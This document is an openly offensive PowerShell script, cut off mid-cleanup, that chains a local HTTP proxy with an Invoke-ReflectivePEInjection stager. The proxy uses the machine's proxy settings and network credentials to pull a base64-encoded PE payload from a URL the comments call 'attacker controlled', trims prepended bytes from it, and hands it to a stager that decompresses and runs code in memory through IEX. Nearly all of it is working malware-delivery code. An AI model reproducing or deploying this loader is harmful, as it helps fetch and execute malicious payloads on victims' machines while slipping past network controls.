#------ Thread 1: the local proxy ------
$Proxy = {
	# Detect and set automatic proxy and network credentials
	$proxy = [System.Net.WebRequest]::GetSystemWebProxy()
	$proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

	$proxyServer = New-Object System.Net.HttpListener
	$proxyServer.Prefixes.Add('http://127.0.0.1:8080/')

	$proxyServer.Start()

	# The first request made is for the stage payload (malicious base64-encoded PE file), we need to identify it
	$stageRequest = $true

	$serverBuffer = new-object System.Byte[] 8
	
	# Server request as long as 
	while ($proxyServer.IsListening) {
		$context = $proxyServer.GetContext()
		$clientRequest = $context.Request
		$proxyResponse = $context.Response
		
		$headers = $clientRequest.Headers
		$headers.Remove("Proxy-Connection")
		$headers.Remove("Host")
		$method = $clientRequest.HttpMethod
		
		
		# -> Attacker Controlled Server Serving A Malicious Base64-Encoded PE File <-
		$destUrl = "http://cdn.rawgit.com/dimpol/bootstrap/v4-dev/calc_string_8"
		
		#------------------------------------
		# Create a proxy request
		$proxyRequest = [System.Net.HttpWebRequest]::Create($destUrl)
		$proxyRequest.Headers = $headers
		$proxyRequest.Method = $method
		$proxyRequest.Proxy = $proxy
		#------------------------------------
		
		
		# Send the request to the origin server (through the upstream proxy) and wait for the response
		$serverResponse = $proxyRequest.GetResponse()
		$responseStream = $serverResponse.GetResponseStream()
		$proxyResponseStream = $proxyResponse.OutputStream

		#---------------------------------------------------------------------------------------------
		# Check if that was the first request from the Invoke-ReflectivePEInjection stager, ie the one used to download
		# the stage payload (malicious base64-encoded PE file)
if ($stageRequest) {
			# Consume 8 bytes, to remove random data that was prepended
			$offset = 0;
			while ($offset -lt 8)
			{	
				$bytesReceived = $responseStream.Read($serverBuffer, $offset, 8 - $offset)
				$offset += $bytesReceived
			}
			$stageRequest = $false
		}

		#--------------------------------------
		# Transmit received bytes to the client
		do {
			$bytesReceived = $responseStream.Read($serverBuffer, 0, $serverBuffer.length)
			$proxyResponseStream.Write($serverBuffer, 0 , $bytesReceived)
			$proxyResponseStream.Flush()
		} while ($bytesReceived -gt 0)
		
		$proxyResponseStream.Close()
	}

	$proxyServer.Stop()
}

#------ Thread 2: the Invoke-ReflectivePEInjection stager ------
$InvokeReflectivePEInjectionStager = {
	# This is an Invoke-ReflectivePEInjection payload that connects back to the localhost on port 8080, which is how the above local proxy instance is configured for
	# Pay attention to call this script from the 32 bits version of powershell: C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
	$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()
}

#------ Starting both threads ------
$proxyThread = [PowerShell]::Create()
$proxyThread.AddScript($Proxy)
$InvokeReflectivePEInjectionThread = [PowerShell]::Create()
$InvokeReflectivePEInjectionThread.AddScript($InvokeReflectivePEInjectionStager)
[System.IAsyncResult]$AsyncProxyJobResult = $null
[System.IAsyncResult]$AsyncInvokeReflectivePEInjectionJobResul = $null

try {
	$AsyncProxyJobResult = $proxyThread.BeginInvoke()
	Sleep 2
	$AsyncInvokeReflectivePEInjectionJobResult = $InvokeReflectivePEInjectionThread.BeginInvoke()
}
catch {
	$ErrorMessage = $_.Exception.Message
	Write-Host $ErrorMessage
}
finally {
	if ($proxyThread -ne $null -and $AsyncProxyJobResult -ne $null) {
        $proxyThread.EndInvoke($AsyncProxyJobResult)
        $proxyThread.Dispose()
    }
	
	if ($InvokeReflectivePEInjectionThread -ne $null -and $AsyncInvokeReflectivePEInjectionJobResult -ne $null) {
        $InvokeReflectivePEInjectionThread.EndInvoke($AsyncInvokeReflectivePEInjectionJobResult)
